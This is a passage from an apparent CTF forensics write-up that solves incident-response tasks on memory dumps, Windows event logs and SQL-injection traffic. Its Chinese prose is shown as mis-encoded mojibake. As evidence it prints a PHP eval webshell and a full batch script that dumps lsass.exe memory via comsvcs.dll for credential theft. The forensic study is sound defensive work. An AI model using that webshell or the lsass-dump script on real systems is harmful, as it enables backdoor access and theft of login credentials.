title="é¢˜ç›®ä¿¡æ¯â€”â€“VOL_EASY"></a>é¢˜ç›®ä¿¡æ¯â€”â€“VOL_EASY</h2><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æŸä¼ä¸šæœåŠ¡å™¨è¿‘æ—¥é­å—éšç§˜å…¥ä¾µã€‚å®‰å…¨å›¢é˜Ÿé€šè¿‡æ—¥å¿—æº¯æºå‘ç°ï¼Œé»‘å®¢åˆ©ç”¨Webåº”ç”¨æ¼æ´æ¤å…¥æ¶æ„åé—¨ï¼Œæ ¹æ®æº¯æºçš„ä¿¡æ¯é…åˆè­¦æ–¹é€®æ•äº†é»‘å®¢ï¼Œå®‰å…¨å›¢é˜Ÿå·²ç»ç´§æ€¥ä¿å­˜äº†é»‘å®¢ç”µè„‘çš„å†…å­˜è½¬å‚¨æ–‡ä»¶ï¼Œè¯·ä½ å¼€å§‹å–è¯ä»¥ä¾¿å›ºå®šè¯æ®ã€‚è¯·æ ¹æ®é¢˜ç›®æ–‡ä»¶ï¼Œæ‰¾å‡ºä¸‹é¢10æ¡è¯æ®è®©ç½ªçŠ¯æœè½¯å§ï¼</span><br></pre></td></tr></table></figure><h3 id="ã€ä»»åŠ¡1ã€‘VOL-EASY"><a href="#ã€ä»»åŠ¡1ã€‘VOL-EASY" class="headerlink" title="ã€ä»»åŠ¡1ã€‘VOL_EASY"></a>ã€ä»»åŠ¡1ã€‘VOL_EASY</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">é¢˜ç›®ä¿¡æ¯ï¼š</span><br><span class="line">é»‘å®¢ä¸Šä¼ çš„ä¸€å¥è¯æœ¨é©¬å¯†ç æ˜¯å¤šå°‘ï¼Ÿ</span><br></pre></td></tr></table></figure><p>lovelymemå¯¼å…¥é•œåƒï¼Œtimeline_ntfså‘ç°ezshell.phpï¼Œå³é”®æ‰“å¼€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">çŸ¥è¯†ç‚¹ï¼šNTFSæ—¥å¿—ä¼šè®°å½•NTFSæ–‡ä»¶ç³»ç»Ÿä¸­æ–‡ä»¶çš„åˆ›å»ºã€ä¿®æ”¹ã€å¢åŠ æ•°æ®ã€åˆ é™¤ç­‰æ“ä½œæ‰§è¡Œçš„æ—¶é—´</span><br></pre></td></tr></table></figure><p><img src="/../images/2.png" alt="2"></p><p><img src="/../images/image-20250729203044299.png" alt="image-20250729203044299"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;solar&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>flag{solar}</p><h3 id="ã€ä»»åŠ¡2ã€‘VOL-EASY"><a href="#ã€ä»»åŠ¡2ã€‘VOL-EASY" class="headerlink" title="ã€ä»»åŠ¡2ã€‘VOL_EASY"></a>ã€ä»»åŠ¡2ã€‘VOL_EASY</h3><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é»‘å®¢ä½¿ç”¨çš„æœ¨é©¬è¿æ¥å·¥å…·å«ä»€ä¹ˆï¼ˆæ¯”å¦‚xx.exeï¼‰ï¼Ÿ(ä»…é¦–å­—æ¯å¤§å†™)</span><br></pre></td></tr></table></figure><p>çœ‹ä¸‹findevilï¼Œå‘ç°èšå‰‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">findevilé€šå¸¸æŒ‡çš„æ˜¯é€šè¿‡æŠ€æœ¯æ‰‹æ®µæ£€æµ‹ã€å®šä½å†…å­˜ä¸­å­˜åœ¨çš„æ¶æ„ä»£ç ã€æ¶æ„è¿›ç¨‹æˆ–å…¶ä»–å¨èƒå› ç´ çš„è¡Œä¸ºæˆ–å·¥å…·åŠŸèƒ½</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729203833881.png" alt="image-20250729203833881"></p><p>flag{Antsword.exe}</p><h3 id="ã€ä»»åŠ¡3ã€‘VOL-EASY"><a href="#ã€ä»»åŠ¡3ã€‘VOL-EASY" class="headerlink" title="ã€ä»»åŠ¡3ã€‘VOL_EASY"></a>ã€ä»»åŠ¡3ã€‘VOL_EASY</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é»‘å®¢ä½¿ç”¨çš„æœ¨é©¬è¿æ¥å·¥å…·çš„ä½ç½®åœ¨å“ªé‡Œï¼ˆæ¯”å¦‚C:\xxxx\xx.exeï¼‰ ï¼Ÿ</span><br></pre></td></tr></table></figure><p>flieç›´æ¥æœAntsword.exe</p><p><img src="/../images/image-20250729204249198.png" alt="image-20250729204249198"></p><p>flag{C:\Tools\AntSword-Loader-v4.0.3-win32-x64\AntSword.exe}</p><h3 id="ã€ä»»åŠ¡4ã€‘VOL-EASY"><a href="#ã€ä»»åŠ¡4ã€‘VOL-EASY" class="headerlink" title="ã€ä»»åŠ¡4ã€‘VOL_EASY"></a>ã€ä»»åŠ¡4ã€‘VOL_EASY</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é»‘å®¢è·å–åˆ°çš„FLAGæ˜¯ä»€ä¹ˆï¼Ÿ</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729204619083.png" alt="image-20250729204619083"></p><p>flag{ok!get_webshell_is_good_idea~}</p><h3 id="ã€ä»»åŠ¡5ã€‘VOL-EASY"><a href="#ã€ä»»åŠ¡5ã€‘VOL-EASY" class="headerlink" title="ã€ä»»åŠ¡5ã€‘VOL_EASY"></a>ã€ä»»åŠ¡5ã€‘VOL_EASY</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é»‘å®¢å…¥ä¾µçš„ç½‘ç«™åœ°å€æ˜¯å¤šå°‘ï¼ˆåªéœ€è¦http://xxxxx/ï¼‰ï¼Ÿ</span><br></pre></td></tr></table></figure><p>æˆ‘è¿™é‡Œæ˜¯æƒ³ç€èšå‰‘è¦è¿ï¼Œå¯èƒ½æ˜¯æ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡ç½‘ç«™ä¸Šï¼Œæ‰€ä»¥åœ¨æµè§ˆå™¨è®°å½•ä¸Šæ‰¾åˆ°çš„</p><p><img src="/../images/image-20250729210250666.png" alt="image-20250729210250666"></p><p>n0o0bç¥è¿™é‡Œæ˜¯å…ˆæ‰«æäº†ä¸€æ‰‹ç½‘ç»œï¼Œç„¶åè¯•äº†192.228.79.201ï¼Œä¸è¡Œå°±ç›´æ¥æ­£åˆ™äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ­£åˆ™è¡¨è¾¾å¼ `\d+\.\d+\.\d+\.\d+` ï¼Œè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ç”¨äºåŒ¹é…IPv4 åœ°å€</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729205747167.png" alt="image-20250729205747167"></p><p><img src="/../images/image-20250729210758496.png" alt="image-20250729210758496"></p><p>flag{<a href="http://192.168.186.140/%7D">http://192.168.186.140/}</a></p><h3 id="ã€ä»»åŠ¡6ã€‘VOL-EASY"><a href="#ã€ä»»åŠ¡6ã€‘VOL-EASY" class="headerlink" title="ã€ä»»åŠ¡6ã€‘VOL_EASY"></a>ã€ä»»åŠ¡6ã€‘VOL_EASY</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é»‘å®¢å…¥ä¾µæ—¶ï¼Œä½¿ç”¨çš„ç³»ç»Ÿç”¨æˆ·åæ˜¯ä»€ä¹ˆï¼Ÿ</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729211338146.png" alt="image-20250729211338146"></p><p>flag{Administrator}</p><h3 id="ã€ä»»åŠ¡7ã€‘VOL-EASY"><a href="#ã€ä»»åŠ¡7ã€‘VOL-EASY" class="headerlink" title="ã€ä»»åŠ¡7ã€‘VOL_EASY"></a>ã€ä»»åŠ¡7ã€‘VOL_EASY</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é»‘å®¢åˆ›å»ºéšè—è´¦æˆ·çš„å¯†ç æ˜¯å¤šå°‘ï¼Ÿ</span><br></pre></td></tr></table></figure><p>æ‰“çš„æ—¶å€™ï¼Œä»è¿™é¢˜å¼€å§‹å°±æ²¡æœ‰è¿è´¯èµ·æ¥ï¼Œæƒ³ç€æ˜¯è¢«æ”»å‡»æœºå™¨çš„ä¿¡æ¯ï¼Œä¸æ‡‚äº†gg</p><p>n0o0bç¥ç›´æ¥å°±æ­£åˆ™æœnet userï¼Œç„¶åçŒœä¸ª5</p><p><img src="/../images/image-20250729211844240.png" alt="image-20250729211844240"></p><p>flag{solar2025}</p><h3 id="ã€ä»»åŠ¡8-9-10ã€‘VOL-EASY"><a href="#ã€ä»»åŠ¡8-9-10ã€‘VOL-EASY" class="headerlink" title="ã€ä»»åŠ¡8,9,10ã€‘VOL_EASY"></a>ã€ä»»åŠ¡8,9,10ã€‘VOL_EASY</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é»‘å®¢é¦–æ¬¡æ“ä½œé¶æœºçš„å…³é”®ç¨‹åºæ˜¯ä»€ä¹ˆï¼Ÿ</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729212439796.png" alt="image-20250729212439796"></p><p>ä¸€å¼€å§‹æ‰¾ezshell.phpï¼Œæœ‰ä¸¤ä¸ªbatæ–‡ä»¶</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">echo</span> [*] æ­£åœ¨è·å– lsass.exe PID...</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> /f &quot;tokens=<span class="number">2</span> delims=,&quot; <span class="variable">%%a</span> <span class="keyword">in</span> (&#x27;tasklist /FI &quot;IMAGENAME eq lsass.exe&quot; /FO CSV /NH&#x27;) <span class="keyword">do</span> (</span><br><span class="line">    <span class="built_in">set</span> PID=<span class="variable">%%~</span>a</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> &quot;<span class="variable">%PID%</span>&quot;==&quot;&quot; (</span><br><span class="line">    <span class="built_in">echo</span> [!] æœªæ‰¾åˆ° lsass.exe è¿›ç¨‹ï¼Œæˆ–æ²¡æœ‰æƒé™ã€‚</span><br><span class="line">    <span class="built_in">pause</span></span><br><span class="line">    <span class="keyword">exit</span> /b <span class="number">1</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> [*] PID: <span class="variable">%PID%</span></span><br><span class="line"><span class="built_in">echo</span> [*] æ­£åœ¨å°è¯•å¯¼å‡ºå†…å­˜è½¬å‚¨...</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> OUTPUT=%~dp0lsass.dmp</span><br><span class="line"></span><br><span class="line">rundll32.exe comsvcs.dll, MiniDump <span class="variable">%PID%</span> <span class="variable">%OUTPUT%</span> full</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">exist</span> &quot;<span class="variable">%OUTPUT%</span>&quot; (</span><br><span class="line">    <span class="built_in">echo</span> [âœ“] æˆåŠŸå¯¼å‡º lsass å†…å­˜ä¸º: <span class="variable">%OUTPUT%</span></span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line">    <span class="built_in">echo</span> [!] å¯¼å‡ºå¤±è´¥ï¼Œå¯èƒ½æƒé™ä¸è¶³ã€‚</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä¸»è¦åŠŸèƒ½æ˜¯å¯¼å‡ºç³»ç»Ÿä¸­lsass.exeè¿›ç¨‹çš„å†…å­˜è½¬å‚¨æ–‡ä»¶ï¼ˆlsass.dmpï¼‰,lsass.exeæ˜¯ Windows ç³»ç»Ÿçš„æœ¬åœ°å®‰å…¨è®¤è¯å­ç³»ç»Ÿè¿›ç¨‹ï¼Œè´Ÿè´£å¤„ç†ç”¨æˆ·ç™»å½•è®¤è¯ã€å¯†ç å“ˆå¸Œå­˜å‚¨ç­‰æ•æ„Ÿå®‰å…¨ä¿¡æ¯</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729213256953.png" alt="image-20250729213256953"></p><p>æ ¹æ®ç¨‹åºæœé•œåƒçš„PIDå°±å¥½äº†ï¼Œå¯ä»¥æ‰¾åˆ°pidï¼Œæ–‡ä»¶è·¯åŠ²ï¼Œç›´æ¥ä¸€æ³¢åé¢ä¸‰é¢˜äº†</p><h2 id="é¢˜ç›®ä¿¡æ¯â€”â€“åº”æ€¥å¤§å¸ˆ"><a href="#é¢˜ç›®ä¿¡æ¯â€”â€“åº”æ€¥å¤§å¸ˆ" class="headerlink" title="é¢˜ç›®ä¿¡æ¯â€”â€“åº”æ€¥å¤§å¸ˆ"></a>é¢˜ç›®ä¿¡æ¯â€”â€“åº”æ€¥å¤§å¸ˆ</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿™æ˜¯ä¸€å°è¢«é»‘å®¢å…¥ä¾µçš„æœåŠ¡å™¨ï¼Œå®‰å…¨å›¢é˜Ÿæœ‰è¿›è¡Œä¸€äº›åŸºç¡€æº¯æºã€‚ç›®å‰æœåŠ¡å™¨å·²ç»æ–­ç½‘å¤„ç†ï¼Œè¯·ä½ ç»§ç»­ååŠ©å®‰å…¨å›¢é˜Ÿè¿›è¡Œæº¯æºåˆ†æï¼Œå°†æ•´ä¸ªè¯æ®é“¾è¡¥å……å®Œæ•´ã€‚</span><br></pre></td></tr></table></figure><p>è¿™ä¹Ÿæ˜¯å–è¯çš„æ—¶å€™ï¼Œè¢«å…¥ä¾µçš„æœåŠ¡å™¨</p><h3 id="ã€ä»»åŠ¡1ã€‘åº”æ€¥å¤§å¸ˆ"><a href="#ã€ä»»åŠ¡1ã€‘åº”æ€¥å¤§å¸ˆ" class="headerlink" title="ã€ä»»åŠ¡1ã€‘åº”æ€¥å¤§å¸ˆ"></a>ã€ä»»åŠ¡1ã€‘åº”æ€¥å¤§å¸ˆ</h3><p>åšçš„æ—¶å€™ï¼Œå¤šæ˜¯ç›´æ¥æ•²çš„cmdå‘½ä»¤,è¿™ä¹ˆçœ‹æ¥è¿˜æ˜¯ç›´æ¥æœäº‹ä»¶çš„idæ›´å¿«ä¸€ç‚¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¯·æäº¤éšè—ç”¨æˆ·çš„åç§°ï¼Ÿ</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729214351239.png" alt="image-20250729214351239"></p><p>å¥½åƒåˆšè¿›æ¥å°±ç»™ç­”æ¡ˆäº†</p><h3 id="ã€ä»»åŠ¡2ã€‘åº”æ€¥å¤§å¸ˆ"><a href="#ã€ä»»åŠ¡2ã€‘åº”æ€¥å¤§å¸ˆ" class="headerlink" title="ã€ä»»åŠ¡2ã€‘åº”æ€¥å¤§å¸ˆ"></a>ã€ä»»åŠ¡2ã€‘åº”æ€¥å¤§å¸ˆ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¯·æäº¤é»‘å®¢çš„IPåœ°å€ï¼Ÿ</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç”±å–è¯å“ªé‡ŒçŸ¥é“ipï¼Œä¹Ÿå¯ä»¥çœ‹phpstudyï¼Œnginxæ—¥å¿—</p><p>C:&#x2F;phpstudy&#x2F;log&#x2F;nginx_log</p><p><img src="/../images/image-20250729215152539.png" alt="image-20250729215152539"></p><h3 id="ã€ä»»åŠ¡3ã€‘åº”æ€¥å¤§å¸ˆ"><a href="#ã€ä»»åŠ¡3ã€‘åº”æ€¥å¤§å¸ˆ" class="headerlink" title="ã€ä»»åŠ¡3ã€‘åº”æ€¥å¤§å¸ˆ"></a>ã€ä»»åŠ¡3ã€‘åº”æ€¥å¤§å¸ˆ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¯·æäº¤é»‘å®¢çš„ä¸€å¥è¯æœ¨é©¬å¯†ç ï¼Ÿ</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç”±å–è¯å“ªé‡ŒçŸ¥é“å¯†ç ï¼Œä¹Ÿå¯ä»¥çœ‹phpstudyä¸‹çš„æ–‡ä»¶</p><p>C:&#x2F;phpstudy&#x2F;WWW&#x2F;uploads&#x2F;</p><p><img src="/../images/image-20250729215449413.png" alt="image-20250729215449413"></p><h3 id="ã€ä»»åŠ¡4ã€‘åº”æ€¥å¤§å¸ˆ"><a href="#ã€ä»»åŠ¡4ã€‘åº”æ€¥å¤§å¸ˆ" class="headerlink" title="ã€ä»»åŠ¡4ã€‘åº”æ€¥å¤§å¸ˆ"></a>ã€ä»»åŠ¡4ã€‘åº”æ€¥å¤§å¸ˆ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¯·æäº¤é»‘å®¢åˆ›å»ºéšè—ç”¨æˆ·çš„TargetSidï¼ˆç›®æ ‡è´¦æˆ·å®‰å…¨IDï¼‰ï¼Ÿ</span><br></pre></td></tr></table></figure><p>wmic useraccount get name,sid</p><p><img src="/../images/image-20250729215809343.png" alt="image-20250729215809343"></p><h3 id="ã€ä»»åŠ¡5ã€‘åº”æ€¥å¤§å¸ˆ"><a href="#ã€ä»»åŠ¡5ã€‘åº”æ€¥å¤§å¸ˆ" class="headerlink" title="ã€ä»»åŠ¡5ã€‘åº”æ€¥å¤§å¸ˆ"></a>ã€ä»»åŠ¡5ã€‘åº”æ€¥å¤§å¸ˆ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¯·æäº¤é»‘å®¢åˆ›å»ºéšè—è´¦æˆ·çš„äº‹ä»¶ï¼ˆæ ¼å¼ä¸º å¹´/æœˆ/æ—¥ æ—¶:åˆ†:ç§’ï¼‰ï¼Ÿ</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729220827054.png" alt="image-20250729220827054"></p><p>äº‹ä»¶æŸ¥çœ‹å™¨æœåˆ›å»ºæ–°è´¦æˆ·äº‹ä»¶ï¼ŒIDä¸º4720</p><h3 id="ã€ä»»åŠ¡6ã€‘åº”æ€¥å¤§å¸ˆ"><a href="#ã€ä»»åŠ¡6ã€‘åº”æ€¥å¤§å¸ˆ" class="headerlink" title="ã€ä»»åŠ¡6ã€‘åº”æ€¥å¤§å¸ˆ"></a>ã€ä»»åŠ¡6ã€‘åº”æ€¥å¤§å¸ˆ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é»‘å®¢å°†è¿™ä¸ªéšè—ç”¨æˆ·å…ˆååŠ å…¥äº†å“ªå‡ ä¸ªç”¨æˆ·ç»„ï¼Ÿæäº¤æ ¼å¼ä¸º ç¬¬ä¸€ä¸ªç”¨æˆ·ç»„-ç¬¬äºŒä¸ªç”¨æˆ·ç»„ï¼Œå¦‚student-teacher</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">äº‹ä»¶ ID 4728ï¼šç”¨æˆ·è¢«æ·»åŠ åˆ°ä¸€ä¸ªå…¨å±€å®‰å…¨ç»„</span><br><span class="line">äº‹ä»¶ ID 4732ï¼šç”¨æˆ·è¢«æ·»åŠ åˆ°ä¸€ä¸ªæœ¬åœ°å®‰å…¨ç»„</span><br><span class="line">äº‹ä»¶ ID 4756ï¼šç”¨æˆ·è¢«æ·»åŠ åˆ°ä¸€ä¸ªé€šç”¨å®‰å…¨ç»„</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729221500496.png" alt="image-20250729221500496"></p><p><img src="/../images/image-20250729221517184.png" alt="image-20250729221517184"></p><p>å…ˆåè¢«æ·»åŠ åˆ°Usersã€Administratorsç»„</p><h3 id="ã€ä»»åŠ¡7ã€‘åº”æ€¥å¤§å¸ˆ"><a href="#ã€ä»»åŠ¡7ã€‘åº”æ€¥å¤§å¸ˆ" class="headerlink" title="ã€ä»»åŠ¡7ã€‘åº”æ€¥å¤§å¸ˆ"></a>ã€ä»»åŠ¡7ã€‘åº”æ€¥å¤§å¸ˆ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é»‘å®¢é€šè¿‡è¿œç¨‹æ¡Œé¢æˆåŠŸç™»é™†ç³»ç»Ÿç®¡ç†å‘˜è´¦å·çš„ç½‘ç»œåœ°å€åŠç«¯å£å·ï¼Ÿæäº¤æ ¼å¼ä¸º IP:PORT å¦‚ 127.0.0.1:41110</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729221843353.png" alt="image-20250729221843353"></p><h2 id="é¢˜ç›®ä¿¡æ¯â€”â€“å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥"><a href="#é¢˜ç›®ä¿¡æ¯â€”â€“å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥" class="headerlink" title="é¢˜ç›®ä¿¡æ¯â€”â€“å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥"></a>é¢˜ç›®ä¿¡æ¯â€”â€“å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ€è€Œå¬å…¬äº¤ç³»ç»Ÿè¢«é»‘å®¢æ”»å‡»ï¼Œé»‘å®¢é€šè¿‡webè¿›è¡Œäº†æ”»å‡»å¹¶è·å–äº†æ•°æ®ï¼Œç„¶åè·å–äº†å…¶ä¸­ä¸€ä½é©¾æ ¡å¸ˆå‚…åœ¨FTPæœåŠ¡ä¸­çš„ç§å¯†æ–‡ä»¶ï¼Œå…¶åé»‘å®¢æ‰¾åˆ°äº†ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´è¿›è¡Œäº†GETshellï¼Œæ§åˆ¶äº†ä¸»æœºæƒé™å¹¶æ¤å…¥äº†æŒ–çŸ¿ç½‘é¡µæŒ–çŸ¿ç—…æ¯’ï¼Œæ¥ä¸‹æ¥ä½ éœ€è¦é€æ­¥æ’æŸ¥ã€‚</span><br></pre></td></tr></table></figure><h3 id="ã€ä»»åŠ¡1ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥"><a href="#ã€ä»»åŠ¡1ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥" class="headerlink" title="ã€ä»»åŠ¡1ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥"></a>ã€ä»»åŠ¡1ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åˆ†æç¯å¢ƒå†…çš„ä¸­é—´ä»¶æ—¥å¿—ï¼Œæ‰¾åˆ°ç¬¬ä¸€ä¸ªæ¼æ´(é»‘å®¢è·å–æ•°æ®çš„æ¼æ´)ï¼Œç„¶åé€šè¿‡åˆ†ææ—¥å¿—ã€æµé‡ï¼Œé€šè¿‡è„šæœ¬è§£å‡ºé»‘å®¢è·å–çš„ç”¨æˆ·å¯†ç æ•°æ®ï¼Œæäº¤è·å–çš„å‰ä¸¤ä¸ªç”¨æˆ·åï¼Œæäº¤æ ¼å¼ï¼šflag&#123;zhangsan-wangli&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729222756742.png" alt="image-20250729222756742"></p><p>è¿›æ¥å°±æ˜¯ä¸€ä¸ªæµé‡åŒ…ï¼Œå‘ç°æ˜¯sqlæ³¨å…¥</p><p><img src="/../images/image-20250729225021003.png" alt="image-20250729225021003"></p><p>è¿æ•°æ®åº“æŸ¥ï¼ŒæŒ‰passwordæ’åº</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br><span class="line">show databases;</span><br><span class="line">use bus_system</span><br><span class="line">select * from bus_drivers order by password;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729225151998.png" alt="image-20250729225151998"></p><p>flag{sunyue-chenhao}</p><h3 id="ã€ä»»åŠ¡2ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥"><a href="#ã€ä»»åŠ¡2ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥" class="headerlink" title="ã€ä»»åŠ¡2ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥"></a>ã€ä»»åŠ¡2ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é»‘å®¢é€šè¿‡è·å–çš„ç”¨æˆ·åå¯†ç ï¼Œåˆ©ç”¨å¯†ç å¤ç”¨æŠ€æœ¯ï¼Œçˆ†ç ´äº†FTPæœåŠ¡ï¼Œåˆ†ææµé‡ä»¥åæ‰¾åˆ°å¼€æ”¾çš„FTPç«¯å£ï¼Œå¹¶æ‰¾åˆ°é»‘å®¢ç™»å½•æˆåŠŸåè·å–çš„ç§å¯†æ–‡ä»¶ï¼Œæäº¤å…¶æ–‡ä»¶ä¸­å†…å®¹ï¼Œæäº¤æ ¼å¼ï¼šflag&#123;xxx&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729230321641.png" alt="image-20250729230321641"></p><p>ç›´æ¥findæœç´¢ftpï¼Œå°±å‡ºäº†</p><h3 id="ã€ä»»åŠ¡3ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥"><a href="#ã€ä»»åŠ¡3ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥" class="headerlink" title="ã€ä»»åŠ¡3ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥"></a>ã€ä»»åŠ¡3ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¯æ¶çš„é»‘å®¢æ‰¾åˆ°äº†ä»»æ„æ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œä½ éœ€è¦åˆ†ææ—¥å¿—å’Œæµé‡ä»¥åŠwebå¼€æ”¾çš„ç¨‹åºæ‰¾åˆ°é»‘å®¢ä¸Šä¼ çš„æ–‡ä»¶ï¼Œæäº¤æœ¨é©¬ä½¿ç”¨çš„å¯†ç ï¼Œæäº¤æ ¼å¼ï¼šflag&#123;password&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºæ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œç›´æ¥å»æ‰¾uploadå°±å¥½äº†</p><p><img src="/../images/image-20250729230656019.png" alt="image-20250729230656019"></p><h3 id="ã€ä»»åŠ¡4ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥"><a href="#ã€ä»»åŠ¡4ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥" class="headerlink" 